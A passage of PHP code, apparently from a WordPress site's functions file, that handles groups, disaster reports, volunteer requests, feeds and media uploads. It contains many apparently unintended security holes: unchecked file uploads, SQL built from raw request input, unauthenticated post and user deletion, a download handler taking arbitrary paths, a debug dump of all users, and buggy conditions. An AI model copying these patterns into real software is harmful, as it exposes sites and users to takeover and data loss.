    if(move_uploaded_file( $_FILES["group_image"]["tmp_name"] , $uploadfile )){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $group_id, $attach_id ); 
    }

        header('Location: '.site_url('wccgroups'));
        exit;
    }
}
add_action('init', 'ums_create_group');

function ums_update_group() {
    if(!empty($_POST['ums_update_group']))
    {
        $group_id = $_POST['group_id'];
        $current_user_id = get_current_user_id();
        $groupDetail = get_post($group_id);
        if($current_user_id!=$groupDetail->post_author){
            add_action('flash_msg',"You can only update created by your group");     
            header('Location: '.$_SERVER["HTTP_REFERER"]);
            exit;
        }
        
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $post_type   =  'groups';
        $post_status  =  'publish'; 
        $group_type   =  ($_POST['group_type'])?sanitize_text_field($_POST['group_type']):""; 
        $taxonomy    =   'ld_group_category';
       
        $updateData = array(
                                'ID' => $group_id,
                                'post_title' => $post_title,
                                'post_content' => $post_content,
                                'post_status' => 'publish',
                                'post_author' => $current_user_id,
                                'post_type' => 'groups',
                                'post_category'=>array( $group_type )
                                );

        wp_update_post( $updateData );
        update_post_meta( $group_id, 'group_type', $group_type);   

        $uploaddir = wp_upload_dir();
        $file = $_FILES["group_image"]["name"];
        $uploadfile = $uploaddir['path'] . '/' . basename( $file );

        if(move_uploaded_file( $_FILES["group_image"]["tmp_name"] , $uploadfile )){
            $filename = basename( $uploadfile );
            $wp_filetype = wp_check_filetype(basename($filename), null );
            $attachment = array(
            'post_mime_type' => $wp_filetype['type'],
            'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
            'post_content' => '',
            'post_status' => 'inherit',
            'menu_order' => $_i + 1000
            );
            $attach_id = wp_insert_attachment( $attachment, $uploadfile );
            set_post_thumbnail( $group_id, $attach_id ); 
        }
        header('Location: '.site_url('wccgroups'));
        exit;
    }
       
}
add_action('init', 'ums_update_group');


function ums_create_resource() {
    if(!empty($_POST['ums_create_resource']) && !empty($_POST['title']))
    {

        $post_title = ($_POST['title'])?sanitize_text_field($_POST['title']):"";
        $post_content = ($_POST['organization'])?sanitize_text_field($_POST['organization']):"";
   
        $current_user_id = get_current_user_id();
         $postData = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'resources'
            );

        if($_POST['ums_create_resource']=="ums_create_resource"){
        $resource_id =     wp_insert_post( $postData );
        foreach($_POST as $key=>$value){
            add_post_meta( $resource_id, $key, sanitize_text_field($value));
        }  
        add_action('form_message',"resources created Successfully"); 
     }else if($_POST['ums_create_resource']=="ums_update_resource"){
        $resource_id = ($_POST['resource_id'])?sanitize_text_field($_POST['resource_id']):"";
        $postData['ID'] = $resource_id;
       $dd  = wp_update_post( $postData );
         foreach($_POST as $key=>$value){
            update_post_meta( $resource_id, $key, sanitize_text_field($value));
        }
     }    
        header('Location: '.site_url('my-resources'));
        exit;
    }
}
add_action('init', 'ums_create_resource');

function ums_delete_resource() {
    if((!empty($_GET['mode']) && $_GET['mode'] =="resource") && !empty($_GET['ID'])){

        global $wpdb;
        $current_user_id = get_current_user_id();

        $post =  $wpdb->get_results( "SELECT ID FROM $wpdb->posts WHERE ID = '".$_GET['ID']."'  AND post_author=  '".$current_user_id."' ",ARRAY_A);
        if ( ! $post ) {
            return ;
        } 
        wp_delete_post( $_GET['ID'] );

        header('Location: '.$_SERVER["HTTP_REFERER"]);
        exit;

        
    }
}
add_action('init', 'ums_delete_resource');

function create_feed() {
    
    if(!empty($_POST['create_feed']))
    {
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();
            $wordpress_post = array(
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'feeds'
            );

        $feed_id =     wp_insert_post( $wordpress_post );
        add_post_meta($feed_id,'feed_group_id',$_POST['ugroup_id']);
        
    //Set thumbnail image   
    
    $uploaddir = wp_upload_dir();
    $file = $_FILES["group_image"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );

    if(move_uploaded_file( $_FILES["group_image"]["tmp_name"] , $uploadfile )){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $feed_id, $attach_id ); 
    }
        header('Location: '.$_SERVER["HTTP_REFERER"]);
        exit;   
      
    }
}
add_action('init', 'create_feed');

function update_feed($query) {
    if(!empty($_POST['update_feed']))
    {
        $post_id  =  $_POST['feed_id'];
        $post = get_post($post_id);
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();
        
            $wordpress_post = array(
                'ID' => $post_id,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'feeds'
            );

       // $feed_id =     wp_insert_post( $wordpress_post );
        $feed_id  =  wp_update_post( $wordpress_post );
        
        
    //Set thumbnail image   
    
         $uploaddir = wp_upload_dir();
    $file = $_FILES["feed_edit_image"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );
    $mv = move_uploaded_file( $_FILES["feed_edit_image"]["tmp_name"] , $uploadfile );

    if($mv){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
       $delete = wp_delete_attachment($post_id,true);
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $post_id, $attach_id ); 
    } 
        
       header('Location: '.$_SERVER["HTTP_REFERER"]);
        exit;
    }
}
add_action('init', 'update_feed');




function create_reportsforms() {
    
    if(!empty($_POST['create_reportsforms']))
    {
        $group_id = ($_POST['group_id'])?sanitize_text_field($_POST['group_id']):"";
        if(empty($group_id)){
            header('Location: '.site_url('wccgroups'));   
        }
        $rf_id = ($_POST['rf_id'])?sanitize_text_field($_POST['rf_id']):"";
         $rf_publish = ($_POST['rf_publish'])?sanitize_text_field($_POST['rf_publish']):"";
        $report_id = ($_POST['report_id'])?sanitize_text_field($_POST['report_id']):"";
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();
        
        if(empty($rf_id)){        
            $reportsformsData = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'reportsforms'
            );

        $rf_id =     wp_insert_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['create_reportsforms'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);
        
        foreach($_POST as $key=>$value){
            if(!empty($value)){
                add_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
        } 
    }else{

         $reportsformsData = array(
            'ID' => $rf_id,
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'reportsforms'
            );

        $rf_id = wp_insert_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['create_reportsforms'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);
        
         if($rf_publish == 'keep_private')
          {
            add_post_meta( $rf_publish, 'rf_publish', @$_POST['rf_publish']);
          }
        elseif($rf_publish == 'All RRN Users')
          {
            add_post_meta( $rf_publish, 'rf_publish', @$_POST['$rf_publish']);
            $all_users = get_users();
            print_r($all_users);
            die;

              
          }
        else{
              add_post_meta( $rf_publish, 'rf_publish', @$_POST['$rf_publish']);
          }
        

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                update_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
            
        }
    }

        if($submitType = "save"){
           header('Location: '.site_url('create-new-report')."?gid=".$group_id."&rf_id=".$rf_id);  
       }else{
          $pp = get_post_permalink($group_id);
          header('Location: '.$pp);   
       }
        exit;   
      
    }
}
add_action('init', 'create_reportsforms');


/*Show custom data in admin dashboard  for Disaster Situational Report*/

add_action( 'admin_menu', 'my_admin_menu' );
	
	function customerview_admin_page(){
	?>
	<div class="wrap">
		<h2>Disaster Situational Reports</h2>
		<?php
		    global $wpdb;
		    
	    	$reportData = $wpdb->get_results("SELECT * FROM wp_posts WHERE post_type = 'reportsforms' ORDER BY ID DESC;");
	  
	    	
    		echo "<table class='widefat fixed'>";
    		echo "<th>Report ID</th>";
    		echo "<th>Date</th>";
    		echo "<th>Event</th>";
    		echo "<th>Org.</th>";
    		echo "<th>City</th>";
    		echo "<th>State</th>";
    		echo "<th>Country</th>";
    		echo "<th>Contact Person</th>";
    		echo "<th>Email</th>";
    		echo "<th>Phone</th>";
		
		if(!empty($reportData)){
                    foreach($reportData as $report){
                            $rid = $report->ID;
                            $postMeta = get_post_meta($rid);

			echo "<tr>";
		//	echo "<td><input type='text' name='ID' value=".$report->ID." size='1' readonly></input></td>";
		echo "<td>".$report->ID."</td>";
			$CusID = $reportData->ID;
			
			echo "<td>".get_post_meta($rid,'rf_date',true)."</td>";
			echo "<td>".$report->post_title."</td>";
			
			echo "<td>".get_post_meta($rid,'rf_org',true)."</td>";
			echo "<td>".get_post_meta($rid,'rf_city',true)."</td>";
			echo "<td>".get_post_meta($rid,'rf_statue',true)."</td>";
			echo "<td>".get_post_meta($rid,'rf_country',true)."</td>";
			echo "<td>".get_post_meta($rid,'rf_contact_person',true)."</td>";
			echo "<td>".get_post_meta($rid,'rf_email',true)."</td>";
			echo "<td>".get_post_meta($rid,'rf_phone',true)."</td>";
			echo "</tr>";
		}}
		echo "</table>";
		?>
	</div>
	<?php
	}
	
	function my_admin_menu() {
		add_menu_page('Customer Request View', 'Disaster Situational Reports', 'manage_options', 'myplugin/view_disaster_situational_report.php', 'customerview_admin_page', 'dashicons-tag', 6  );
	}


/*Show custom data in admin dashboard Disaster Situational Report*/


/*update disaster reports*/

function update_reportsforms() {
    
    if(!empty($_POST['update_reportsforms']))
    {

       $group_id = ($_POST['group_id'])?sanitize_text_field($_POST['group_id']):"";
       /* if(empty($group_id)){
            header('Location: '.site_url('wccgroups'));   
        }*/
        $rf_id = ($_POST['rf_id'])?sanitize_text_field($_POST['rf_id']):"";
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();

        if(empty($rf_id)){        

            $reportsformsData = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'reportsforms'
            );

        //$rf_id =     wp_insert_post( $reportsformsData );
        $rf_id =     wp_update_post( $reportsformsData );
        
        unset($_POST['post_title'],$_POST['update_reportsforms'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                add_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
            
        } 
    }else{

         $reportsformsData = array(
            'ID' => $rf_id,
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'reportsforms'
            );

        $rf_id =     wp_update_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['update_reportsforms'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                update_post_meta( $rf_id, $key, sanitize_text_field($value));
            }       
        }
    }
        if($submitType = "save"){
           header('Location: '.site_url('edit-disaster-report')."?gid=".$group_id."&rf_id=".$rf_id);  
       }else{
          $pp = get_post_permalink($group_id);
          header('Location: '.$pp);   
       }
        exit;  

    }
}
add_action('init', 'update_reportsforms');



/*update after action report*/

function update_ActionReport() {
    
    if(!empty($_POST['update_ActionReport']))
    {

       $group_id = ($_POST['group_id'])?sanitize_text_field($_POST['group_id']):"";
       /* if(empty($group_id)){
            header('Location: '.site_url('wccgroups'));   
        }*/
        $rf_id = ($_POST['rf_id'])?sanitize_text_field($_POST['rf_id']):"";
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();

        if(empty($rf_id)){        
            $reportsformsData = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'afterActionReport'
            );

        //$rf_id =     wp_insert_post( $reportsformsData );
        $rf_id =     wp_update_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['update_ActionReport'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                add_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
        } 
    }else{

         $reportsformsData = array(
            'ID' => $rf_id,
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'afterActionReport'
            );

        $rf_id =     wp_update_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['update_ActionReport'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                update_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
        }
    }

       if($submitType = "save"){
           header('Location: '.site_url('create-after-action-report')."?gid=".$group_id."&rf_id=".$rf_id);  
       }else{
          $pp = get_post_permalink($group_id);
          header('Location: '.$pp);   
       }
        exit;   

    }
}
add_action('init', 'update_ActionReport');



function create_volunteerReq() {
    
    if(!empty($_POST['create_volunteerReq']))
    {
        $group_id = ($_POST['group_id'])?sanitize_text_field($_POST['group_id']):"";
        if(empty($group_id)){
            header('Location: '.site_url('wccgroups'));   
        }
        $rf_id = ($_POST['rf_id'])?sanitize_text_field($_POST['rf_id']):"";
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();

        if(empty($rf_id)){        

            $reportsformsData = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'volunteer_request'
            );

        $rf_id =     wp_insert_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['create_volunteerReq'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                add_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
            
        } 
    }else{

         $reportsformsData = array(
            'ID' => $rf_id,
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'volunteer_request'
            );

        $rf_id =     wp_insert_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['create_volunteerReq'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                update_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
            
        }
    }

        if($submitType = "save"){
           header('Location: '.site_url('create-organization-volunteer-request')."?gid=".$group_id."&rf_id=".$rf_id);  
       }else{
          $pp = get_post_permalink($group_id);
          header('Location: '.$pp);   
       }
    
       
        exit;   
      
    }
}
add_action('init', 'create_volunteerReq');


function create_needIntakeForm() {
    
    if(!empty($_POST['create_needIntakeForm']))
    {

        $group_id = ($_POST['group_id'])?sanitize_text_field($_POST['group_id']):"";
        if(empty($group_id)){
            header('Location: '.site_url('wccgroups'));   
        }
        $rf_id = ($_POST['rf_id'])?sanitize_text_field($_POST['rf_id']):"";
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();

        if(empty($rf_id)){        

            $reportsformsData = array(
            'post_title' =>'supplier_need_intake_form',
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'supplierNeedIntake'
            );

        $rf_id =     wp_insert_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['create_needIntakeForm'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                add_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
            
        } 
    }else{

         $reportsformsData = array(
            'ID' => $rf_id,
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'supplierNeedIntake'
            );

        $rf_id =     wp_insert_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['create_needIntakeForm'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                update_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
            
        }
    }

        if($submitType = "save"){
           header('Location: '.site_url('create-survivor-need-intake-form')."?gid=".$group_id."&rf_id=".$rf_id);  
       }else{
          $pp = get_post_permalink($group_id);
          header('Location: '.$pp);   
       }
    
       
        exit;   
      
    }
}
add_action('init', 'create_needIntakeForm');



function after_ActionReport() {
    
    if(!empty($_POST['after_ActionReport']))
    {

        $group_id = ($_POST['group_id'])?sanitize_text_field($_POST['group_id']):"";
        if(empty($group_id)){
            header('Location: '.site_url('wccgroups'));   
        }
        $rf_id = ($_POST['rf_id'])?sanitize_text_field($_POST['rf_id']):"";
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();

        if(empty($rf_id)){        

            $reportsformsData = array(
            'post_title' =>'after_action_report',
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'afterActionReport'
            );

        $rf_id =     wp_insert_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['after_ActionReport'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                add_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
            
        } 
    }else{

         $reportsformsData = array(
            'ID' => $rf_id,
            'post_title' => 'after_action_report',
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'afterActionReport'
            );

        $rf_id =     wp_insert_post( $reportsformsData );
        unset($_POST['post_title'],$_POST['after_ActionReport'],$_POST['reportsforms_nonce'],$_POST['save'],$_POST['finish']);

        foreach($_POST as $key=>$value){
            if(!empty($value)){
                update_post_meta( $rf_id, $key, sanitize_text_field($value));
            }
            
        }
    }

        if($submitType = "save"){
           header('Location: '.site_url('create-after-action-report')."?gid=".$group_id."&rf_id=".$rf_id);  
       }else{
          $pp = get_post_permalink($group_id);
          header('Location: '.$pp);   
       }
        exit;   
      
    }
}
add_action('init', 'after_ActionReport');



function delete_afterActionReport($query) {
    if(!empty($_POST['delete_afterActionReport']))
    {
        $report_id  =  $_POST['report_id'];   
        wp_delete_post($report_id);
        add_action('form_message',"After Action Report Deleted Successfully.");

         //$pp = get_post_permalink($report_id); 
         header('Location: '.site_url('wccgroups'));
     
    }
}
add_action('init', 'delete_afterActionReport');



function delete_my_account($query) {
    if(!empty($_POST['delete_my_account']))
    {
        $userID  =  $_POST['user_id'];   
        wp_delete_user($userID);
         add_action('form_message',"User Deleted Successfully.");
         header('Location: '.site_url('')); 
    }
}
add_action('init', 'delete_my_account');




function delete_disasterReport($query) {
    if(!empty($_POST['delete_disasterReport']))
    {
        $report_id  =  $_POST['report_id'];   
        wp_delete_post($report_id);
        add_action('form_message',"Disaster  Action Report Deleted Successfully."); 
         header('Location: '.site_url('wccgroups'));
      exit;   
    }
    
}
add_action('init', 'delete_disasterReport');



function update_blog($query) {
    if(!empty($_POST['update_blog']))
    {
       

        $post_id  =  $_POST['blog_edit_id'];
        $post = get_post($post_id);
        $post_title = ($_POST['post_title'])?sanitize_text_field($_POST['post_title']):"";
        $post_content = ($_POST['post_content'])?sanitize_text_field($_POST['post_content']):"";
        $current_user_id = get_current_user_id();
        
        $updatePostData = array(
            'ID' => $post_id,
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => 'post'
        );
       
        $blogID =     wp_update_post( $updatePostData );
        
        
    //Set thumbnail image   
    
    $uploaddir = wp_upload_dir();
    $file = $_FILES["blog_edit_image"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );

    $mv = move_uploaded_file( $_FILES["blog_edit_image"]["tmp_name"] , $uploadfile );

    if(!$mv){
       // echo "image not uploaded";
    }
   

    if($mv ){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
        $delete = wp_delete_attachment($post_id,true);
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $post_id, $attach_id ); 
    }           
    header('Location: '.$_SERVER["HTTP_REFERER"]);
    exit;
}
}
add_action('init', 'update_blog');



function delete_feed($query) {
    if(!empty($_POST['delete_feed']))
    {
       $post_id  =  $_POST['feed_id'];   
        wp_delete_post($post_id);
        add_action('form_message',"Feed Deleted Successfully"); 
     
}
}
add_action('init', 'delete_feed');






/**
 * LearnDash - Example kook into WordPress 'register_new_user' action 
 * to enroll user into a course or group.
 */
 function ums_enroll_user_in_group() {
    if ( ! empty( $_GET['user_id'] ) && ! empty( $_GET['group_id'] ) ) {
        // Do something with the new user ID. 
        
        //Maybe call the LD function to enroll them into a course.  
        //$course_id = 123; // Dummy course ID for new registrations.
        //ld_update_course_access( $user_id, $course_id );

        // Or add them to a Group
        $group_id =$_GET['group_id'];
        //ld_update_group_access( $user_id, $group_id );
       /* if ( isset( $_GET['course_id'] ) ) {
            $course_id = absint( $_GET['course_id'] );
            if ( ! empty( $course_id ) ) {
                ld_update_course_access( $user_id, $course_id );
            }
        }*/

        if ( isset( $_GET['group_id'] ) ) {
            $group_id = absint( $_GET['group_id'] );
            if ( ! empty( $group_id ) ) {
                ld_update_group_access( $_GET['user_id'], $_GET['group_id'] );
            }
        }
    }
}


add_action('init', 'ums_enroll_user_in_group');



function invite_member($query) {
    global $wpdb;
     $tablename =  'group_invite';
    if(!empty($_POST['invite_member']))
    {
        
         $member_id = ($_POST['member_id'])?sanitize_text_field($_POST['member_id']):"";
         $current_user_id = get_current_user_id();
         $group_id = ($_POST['group_id'])?sanitize_text_field($_POST['group_id']):"";
          $wordpress_post = array(
            'invited_to' => $member_id,
            'invited_from' => $current_user_id,
            'status' => 'pending',
            'group_id' => $group_id
            );  
        
         $wpdb->insert('group_invite',$wordpress_post);

        add_action('form_message',"Member Invited  Successfully"); 
     
}
}
add_action('init', 'invite_member');

function ums($va){
    //echo "<pre>"; print_r($val);die;
}

add_action('init', 'my_custom_init');
    function my_custom_init() {
        add_post_type_support( 'resourcemedia', 'thumbnail' ); 
    }

function reg_tag() {
     register_taxonomy_for_object_type('post_tag', 'resourcemedia');
     register_taxonomy_for_object_type('category', 'resourcemedia');
    register_taxonomy_for_object_type('ld_group_tag', 'resourcemedia');
}
add_action('init', 'reg_tag');


add_action('init', function() {
    register_taxonomy('donation_category', ['donation'], [
        'label' => __('Donation Category', 'txtdomain'),
        'hierarchical' => false,
        'rewrite' => ['slug' => 'donation_category'],
        'show_admin_column' => true,
        'show_in_rest' => true,
        'labels' => [
            'singular_name' => __('Donation Category', 'txtdomain'),
            'all_items' => __('All Donation Category', 'txtdomain'),
            'edit_item' => __('Edit Donation Category', 'txtdomain'),
            'view_item' => __('View Donation Category', 'txtdomain'),
            'update_item' => __('Update Donation Category', 'txtdomain'),
            'add_new_item' => __('Add New Donation Category', 'txtdomain'),
            'new_item_name' => __('New Donation Category', 'txtdomain'),
            'search_items' => __('Search Donation Category', 'txtdomain'),
            'popular_items' => __('Popular Donation Category', 'txtdomain'),
            'separate_items_with_commas' => __('Separate Category with comma', 'txtdomain'),
            'choose_from_most_used' => __('Choose from most used Category', 'txtdomain'),
            'not_found' => __('No Category found', 'txtdomain'),
        ]
    ]);
});




function delete_resource_media() {
    $jsonResponseData = array();
    $post_id  =  $_POST['media_id'];   
    wp_delete_post($post_id);       
    $jsonResponseData['msg'] = "Media deleted successfully"; 
    $jsonResponse = json_encode($jsonResponseData); 
    echo $jsonResponse;
    die();
}
add_action( 'wp_ajax_delete_resource_media', 'delete_resource_media' );   
add_action( 'wp_ajax_nopriv_delete_resource_media', 'delete_resource_media' ); 


function ums_update_resourcemedia() {
    if(!empty($_POST['ums_update_media']))
    {
       
        $media_post_id = ($_POST['mresource_id'])?sanitize_text_field($_POST['mresource_id']):"";
        $post_title = ($_POST['title'])?sanitize_text_field($_POST['title']):"";
        $post_content = ($_POST['mr_description'])?sanitize_text_field($_POST['mr_description']):"";
        $post_type   =  'resourcemedia';
        $post_status  =  'publish'; 
        $tags   =  ($_POST['tags'])?$_POST['tags']:""; 
        $taxonomy    =   'ld_group_category';
        $mr_group = ($_POST['mr_group'])?sanitize_text_field($_POST['mr_group']):"";
        $current_user_id = get_current_user_id();
        $updatePostData = array(
            'ID' => $media_post_id,
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => $post_type,
            //'post_parent' => sanitize_text_field($mr_group)
        );     
        wp_update_post( $updatePostData );
        update_post_meta( $media_post_id, 'resourcemedia_group_id', $mr_group);
        update_post_meta( $media_post_id, 'resource_media_group_id', $mr_group);
        if(!empty($tags)){
           update_post_meta( $media_post_id, 'resource_ld_group_tag', $tags);  
        }
         
       

    

    $uploaddir = wp_upload_dir();
    $file = $_FILES["resource_media_img_edit"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );

    if(move_uploaded_file( $_FILES["resource_media_img_edit"]["tmp_name"] , $uploadfile )){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
        $delete = wp_delete_attachment($media_post_id,true);
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $media_post_id, $attach_id ); 
    }

     

       header('Location: '.$_SERVER["HTTP_REFERER"]);
        exit;
    }
}

add_action('init', 'ums_update_resourcemedia');

function ums_create_resourcemedia() {
    if(!empty($_POST['ums_create_media']))
    {
        
      
        $post_title = ($_POST['title'])?sanitize_text_field($_POST['title']):"";
        $post_content = ($_POST['mr_description'])?sanitize_text_field($_POST['mr_description']):"";
        $post_type   =  'resourcemedia';
        $post_status  =  'publish'; 
        $tags   =  ($_POST['tags'])?$_POST['tags']:""; 
        $taxonomy    =   'ld_group_category';
        $mr_group = ($_POST['mr_group'])?$_POST['mr_group']:"";
        $current_user_id = get_current_user_id();


            $wordpress_post = array(
            'post_title' => $post_title,
            'post_content' => $post_content,
            'post_status' => 'publish',
            'post_author' => $current_user_id,
            'post_type' => $post_type,
            'post_parent' => $mr_group,

            //'post_category'=>array( $term_id )
            );

        $media_post_id =     wp_insert_post( $wordpress_post );

        add_post_meta( $media_post_id, 'resourcemedia_group_id', $mr_group);
        if(!empty($tags)){
            add_post_meta( $media_post_id, 'resource_ld_group_tag', $tags);
        }
        
        add_post_meta( $media_post_id, 'resource_group_id', @$mr_group);
        add_post_meta( $media_post_id, 'resource_media_group_id', @$mr_group);


    $uploaddir = wp_upload_dir();
    $file = $_FILES["resource_media_img"]["name"];
    $uploadfile = $uploaddir['path'] . '/' . basename( $file );

    if(move_uploaded_file( $_FILES["resource_media_img"]["tmp_name"] , $uploadfile )){
        $filename = basename( $uploadfile );
        $wp_filetype = wp_check_filetype(basename($filename), null );
        $attachment = array(
        'post_mime_type' => $wp_filetype['type'],
        'post_title' => preg_replace('/\.[^.]+$/', '', $filename),
        'post_content' => '',
        'post_status' => 'inherit',
        'menu_order' => $_i + 1000
        );
        $attach_id = wp_insert_attachment( $attachment, $uploadfile );
        set_post_thumbnail( $media_post_id, $attach_id ); 
    }


        header('Location: '.$_SERVER["HTTP_REFERER"]);
        exit;
    }
}
add_action('init', 'ums_create_resourcemedia');

// Start the download if there is a request for that
function ibenic_download_file(){
   
  if( isset( $_GET["download_file"] ) && isset( $_GET['download_file'] ) ) {
        ibenic_send_file();
    }
}
add_action('init','ibenic_download_file');


function ibenic_send_file(){
    //get filedata
  $file = $_GET['download_file'];
  //$theFile = $download_file;
  
  if( ! $file ) {
    return;
  }  

      header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Content-Transfer-Encoding: binary');
